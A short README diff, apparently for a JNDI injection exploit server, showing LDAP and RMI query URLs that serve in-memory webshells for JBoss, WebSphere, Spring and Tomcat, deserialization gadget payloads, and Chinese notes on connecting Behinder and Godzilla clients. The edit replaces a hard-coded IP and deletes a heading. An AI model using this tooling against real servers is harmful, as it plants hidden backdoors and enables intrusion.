@@ -56,7 +56,7 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Basic/JBossMemshell
     ldap://0.0.0.0:1389/Basic/WebsphereMemshell
     ldap://0.0.0.0:1389/Basic/SpringMemshell
-    rmi://42.192.234.204:1099/jilt123 -c [cmd]
+    rmi://0.0.0.0:1099/jilt123 -c [cmd]
 
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
     ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]
@@ -172,8 +172,6 @@ Supported LADP Queries：
 ## 🏀```内存shell```说明2
 * ```TomcatMemshell3``` 可直接使用冰蝎3客户端连接 推荐使用此payload
 * ```GodzillaMemshell``` 可直接使用哥斯拉客户端连接 推荐使用此payload
-## 🏉添加内容
-
 ## 🥋添加内容
 
 新增哥斯拉内存马
